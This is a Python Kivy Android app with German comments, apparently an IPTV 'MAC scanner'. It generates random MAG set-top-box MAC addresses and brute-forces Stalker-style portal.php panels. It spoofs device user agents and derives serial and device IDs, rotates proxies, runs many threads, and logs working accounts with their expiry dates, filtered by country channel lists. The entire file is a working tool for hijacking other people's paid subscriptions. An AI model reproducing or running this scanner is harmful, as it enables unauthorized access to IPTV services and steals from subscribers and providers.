# -*- coding: utf-8 -*-
import os
import sys
import time
import random
import re
import threading
import json
import hashlib
from datetime import datetime
import requests

# Kivy-spezifische Importe
from kivy.app import App
from kivy.utils import platform
from kivy.clock import Clock
from kivy.uix.slider import Slider
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput

# -------------------------
# Pfad- & Rechte-Logik
# -------------------------
if platform == 'android':
    from jnius import autoclass
    def check_all_files_permission():
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        Environment = autoclass('android.os.Environment')
        if not Environment.isExternalStorageManager():
            try:
                Intent = autoclass('android.content.Intent')
                Settings = autoclass('android.provider.Settings')
                Uri = autoclass('android.net.Uri')
                intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                uri = Uri.parse(f"package:{PythonActivity.mActivity.getPackageName()}")
                intent.setData(uri)
                PythonActivity.mActivity.startActivity(intent)
            except: pass
    check_all_files_permission()
    BASE = "/storage/emulated/0/Download/Vortex_Pulse"
else:
    BASE = os.path.dirname(os.path.abspath(sys.argv[0]))

PATHS = {
    "panel_dir": os.path.join(BASE, "eingabe", "panel"),
    "combo_dir": os.path.join(BASE, "eingabe", "combo"),
    "hits_dir": os.path.join(BASE, "Hits"),
    "proxy_dir": os.path.join(BASE, "eingabe", "proxy")
}

for folder in PATHS.values():
    os.makedirs(folder, exist_ok=True)

# -------------------------
# Globale Variablen
# -------------------------
stop_signal = threading.Event()
hit_lock = threading.Lock()
logged_hits = set()
proxies_list = []
stats = {"checked": 0, "hits": 0, "total": 0}
current_threads = 3 

# -------------------------
# Authentifizierung & MAC Gen
# -------------------------

def generate_random_macs(count):
    macs = []
    for _ in range(count):
        suffix = ":".join(["{:02x}".format(random.randint(0, 255)) for _ in range(3)])
        macs.append(f"00:1A:79:{suffix.upper()}")
    
    combo_path = os.path.join(PATHS["combo_dir"], "combo.txt")
    with open(combo_path, "w") as f:
        for m in macs:
            f.write(f"{m}\n")
    return count

def get_auth_elements(mac):
    mac_clean = mac.strip().upper()
    serial = hashlib.md5(mac_clean.encode()).hexdigest().upper()
    sn = serial[:13]
    device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
    device_id2 = hashlib.sha256(mac_clean.encode()).hexdigest().upper()
    return sn, device_id, device_id2

def build_headers(panel_url, mac_enc, token=None, auth_data=None):
    user_agents = [
        {"ua": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 612 Safari/533.3", "xua": "Model: MAG322; SW: 2.20-r19-pub-322"},
        {"ua": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 5 rev: 540 Safari/533.3", "xua": "Model: MAG540; SW: 5.1.0-r1-pub-540"}
    ]
    choice = random.choice(user_agents)
    ref = f"{panel_url}/c/"
    cookie_str = f"mac={mac_enc}; stb_lang=en; timezone=Europe/Berlin;"
    if auth_data:
        sn, d1, d2 = auth_data
        cookie_str += f" sn={sn}; device_id={d1}; device_id2={d2};"

    headers = {"User-Agent": choice["ua"], "Referer": ref, "Cookie": cookie_str, "X-User-Agent": choice["xua"]}
    if token: headers["Authorization"] = f"Bearer {token}"
    return headers

# -------------------------
# Kern-Logik (Kombinierter Bouquet-Check)
# -------------------------

def get_account_expiry(session, panel_url, mac, token, auth_data, filters=None):
    VALID_MONTHS = ["JANUARY", "FEBRUARY", "MARCH", "APRIL", "MAY", "JUNE", 
                    "JULY", "AUGUST", "SEPTEMBER", "OCTOBER", "NOVEMBER", "DECEMBER"]
    
    COUNTRY_MAP = {
        "DE": ["DE", "GER", "GERMANY", "DEUTSCHLAND", "DEUTSCH", "DACH"],
        "TR": ["TR", "TURKEY", "TURK", "TURKIYE", "TÜRK"],
        "EU": ["EU", "EUROPE", "EUROPA", "ITALY", "ITA", "SPAIN", "ESP", "FRANCE", "FRA", "GREECE", "GR"],
        "UK": ["UK", "UNITED KINGDOM", "ENGLAND", "BRITISH", "SKY UK"],
        "US": ["US", "USA", "AMERICA", "UNITED STATES"]
    }

    try:
        mac_enc = mac.replace(":", "%3A")
        headers = build_headers(panel_url, mac_enc, token, auth_data)
        
        # 1. Account-Info (für Ablaufdatum)
        r_info = session.get(f"{panel_url}/portal.php?type=account_info&action=get_main_info", headers=headers, timeout=12)
        if r_info.status_code != 200: return None
        data_main = r_info.json()
        
        # 2. Bouquet-Liste (für Länderfilter)
        r_list = session.get(f"{panel_url}/portal.php?type=itv&action=get_ordered_list", headers=headers, timeout=12)
        data_bouquets = r_list.json() if r_list.status_code == 200 else {}

        # Kombinierter Text für Filter (Account-Info + Bouquet-Liste)
        search_blob = (json.dumps(data_main) + json.dumps(data_bouquets)).upper()
        
        if filters:
            # Wir erstellen eine Liste ALLER erlaubten Begriffe für diesen Scan
            all_allowed_terms = []
            for f in filters:
                f_clean = f.upper().strip() # Entfernt Leerzeichen vor/nach dem Land
                if not f_clean: continue
                all_allowed_terms.append(f_clean)
                # Falls das Land in unserer Map ist (z.B. DE -> GERMANY), alles hinzufügen
                if f_clean in COUNTRY_MAP:
                    all_allowed_terms.extend(COUNTRY_MAP[f_clean])
            
            # WICHTIG: Prüfen, ob MINDESTENS einer der Begriffe im search_blob steckt
            found_match = False
            for term in all_allowed_terms:
                if term in search_blob:
                    found_match = True
                    break # Ein Treffer reicht uns!
            
            if not found_match:
                return None # Kein Treffer -> MAC überspringen

        # Datumssuche
        for val in re.findall(r"['\"](.*?)['\"]", str(data_main)):
            if any(m in val.upper() for m in VALID_MONTHS):
                return val
        
        return "Active (No Date)" 
    except: return None

def scan_single_job(panel_url, mac, filters=None, log_callback=None):
    if stop_signal.is_set(): return
    session = requests.Session()
    if proxies_list:
        px = random.choice(proxies_list)
        session.proxies = {"http": px, "https": px}

    try:
        auth_data = get_auth_elements(mac)
        mac_enc = mac.replace(":", "%3A")
        r = session.get(f"{panel_url}/portal.php?type=stb&action=handshake&mac={mac_enc}", headers=build_headers(panel_url, mac_enc, auth_data=auth_data), timeout=12)
        token = r.json().get("js", {}).get("token")
        
        if token:
            expiry = get_account_expiry(session, panel_url, mac, token, auth_data, filters)
            if expiry:
                with hit_lock:
                    key = f"{panel_url}|{mac}"
                    if key not in logged_hits:
                        logged_hits.add(key)
                        stats["hits"] += 1
                        clean_name = re.sub(r'[:\.]', '_', panel_url.split("//")[-1].split("/")[0])
                        file_path = os.path.join(PATHS["hits_dir"], f"{clean_name}.txt")
                        with open(file_path, "a", encoding="utf-8") as f:
                            if os.path.getsize(file_path) == 0: f.write(f"{panel_url}\n")
                            f.write(f"{mac} | Expiry: {expiry}\n")
                        if log_callback: log_callback(f"[HIT] {mac} -> {expiry}")
    except: pass
    finally:
        with hit_lock: stats["checked"] += 1
        session.close()

# -------------------------
# UI (Original Struktur)
# -------------------------

class VortexApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical', padding=15, spacing=15)
        self.status_label = Label(text="Vortex Pulse VMOD - Premium Scanner", size_hint_y=None, height=80, font_size='18sp')
        layout.add_widget(self.status_label)

        speed_box = BoxLayout(orientation='horizontal', size_hint_y=None, height=60)
        self.speed_info = Label(text=f"Threads: {current_threads}", size_hint_x=0.3)
        self.speed_slider = Slider(min=1, max=25, value=current_threads, step=1)
        self.speed_slider.bind(value=self.update_speed)
        speed_box.add_widget(self.speed_info); speed_box.add_widget(self.speed_slider)
        layout.add_widget(speed_box)

        self.filter_input = TextInput(hint_text="Länderfilter (z.B. DE, TR, EU, UK)", multiline=False, size_hint_y=None, height=90)
        layout.add_widget(self.filter_input)

        gen_box = BoxLayout(orientation='horizontal', size_hint_y=None, height=90, spacing=10)
        self.gen_count = TextInput(text="1000", multiline=False, input_filter="int", size_hint_x=0.3)
        self.gen_btn = Button(text="MACs GENERIEREN", background_color=(0.2, 0.6, 1, 1))
        self.gen_btn.bind(on_press=self.do_generate)
        gen_box.add_widget(self.gen_count); gen_box.add_widget(self.gen_btn)
        layout.add_widget(gen_box)

        self.log_area = TextInput(readonly=True, background_color=(0,0,0,1), foreground_color=(0,1,0,1), font_size='13sp')
        scroll = ScrollView(); scroll.add_widget(self.log_area); layout.add_widget(scroll)

        btn_layout = BoxLayout(orientation='horizontal', size_hint_y=None, height=120, spacing=10)
        self.start_btn = Button(text="START", background_color=(0,0.8,0,1)); self.start_btn.bind(on_press=self.start_logic)
        self.stop_btn = Button(text="STOP", disabled=True, background_color=(0.8,0,0,1)); self.stop_btn.bind(on_press=self.stop_scan)
        self.exit_btn = Button(text="EXIT", background_color=(0.4,0.4,0.4,1)); self.exit_btn.bind(on_press=self.stop_app)
        
        btn_layout.add_widget(self.start_btn); btn_layout.add_widget(self.stop_btn); btn_layout.add_widget(self.exit_btn)
        layout.add_widget(btn_layout)
        
        Clock.schedule_interval(self.refresh_ui, 0.5)
        return layout

    def update_speed(self, instance, value):
        global current_threads
        current_threads = int(value)
        self.speed_info.text = f"Threads: {current_threads}"

    def do_generate(self, instance):
        count = int(self.gen_count.text) if self.gen_count.text else 0
        num = generate_random_macs(count)
        self.update_log(f"-> {num} MACs erfolgreich generiert!")

    def refresh_ui(self, dt):
        if self.start_btn.disabled:
            remaining = max(0, stats['total'] - stats['checked'])
            self.status_label.text = f"Geprüft: {stats['checked']} | Hits: {stats['hits']} | Offen: {remaining}"
            if remaining == 0 and stats['total'] > 0:
                self.status_label.text = f"Geprüft: {stats['total']} | Hits: {stats['hits']} | Offen: 0"

    def update_log(self, text):
        def _add(dt): 
            self.log_area.text += f"{text}\n"
            self.log_area.cursor = (0, len(self.log_area.text))
        Clock.schedule_once(_add)

    def start_logic(self, instance):
        stop_signal.clear()
        stats["checked"] = 0; stats["hits"] = 0; stats["total"] = 0
        self.log_area.text = ""; self.status_label.text = "Initialisiere..."
        
        def load(path):
            if not os.path.exists(path): return []
            with open(path, 'r', errors='ignore') as f:
                return [l.strip() for l in f if l.strip()]

        panels = [p if p.startswith("http") else f"http://{p}" for p in load(os.path.join(PATHS["panel_dir"], "panel.txt"))]
        macs = load(os.path.join(PATHS["combo_dir"], "combo.txt"))
        
        if not panels or not macs:
            self.update_log("FEHLER: Daten fehlen!"); return

        jobs = [(p, m) for p in panels for m in macs]
        random.shuffle(jobs)
        stats["total"] = len(jobs)
        
        f_text = self.filter_input.text.strip()
        filters = [f.strip() for f in f_text.split(",") if f.strip()] if f_text else None
        
        self.start_btn.disabled = True; self.stop_btn.disabled = False
        threading.Thread(target=self.run_scanner, args=(jobs, filters), daemon=True).start()

    def run_scanner(self, jobs, filters):
        def worker():
            while not stop_signal.is_set():
                try:
                    with hit_lock:
                        if not jobs: break
                        p, m = jobs.pop()
                    scan_single_job(p, m, filters, self.update_log)
                except: break
        
        threads = [threading.Thread(target=worker, daemon=True) for _ in range(current_threads)]
        for t in threads: t.start()
        for t in threads: t.join()
        Clock.schedule_once(lambda dt: self.finish_scan())

    def finish_scan(self):
        self.start_btn.disabled = False; self.stop_btn.disabled = True
        self.update_log("--- SCAN BEENDET ---")

    def stop_scan(self, instance): 
        stop_signal.set(); self.update_log("Stoppe...")

    def stop_app(self, instance):
        stop_signal.set(); App.get_running_app().stop()

if __name__ == "__main__":
    VortexApp().run()
